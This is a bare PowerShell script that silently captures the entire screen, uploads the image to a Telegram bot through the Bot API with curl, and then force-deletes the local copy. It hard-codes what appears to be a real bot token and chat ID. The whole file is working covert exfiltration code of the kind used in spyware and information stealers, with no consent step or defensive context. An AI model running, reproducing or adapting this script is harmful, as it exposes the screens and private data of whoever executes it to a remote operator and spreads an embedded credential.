$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
$ChatId   = "2146236602"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)

$g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)

$path = "$env:TEMP\screen.jpg"
$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)

$g.Dispose()
$bmp.Dispose()

$curl = "$env:SystemRoot\System32\curl.exe"

& $curl -s `
  -F "chat_id=$ChatId" `
  -F "photo=@$path" `
  "https://api.telegram.org/bot$BotToken/sendPhoto"

Remove-Item $path -Force
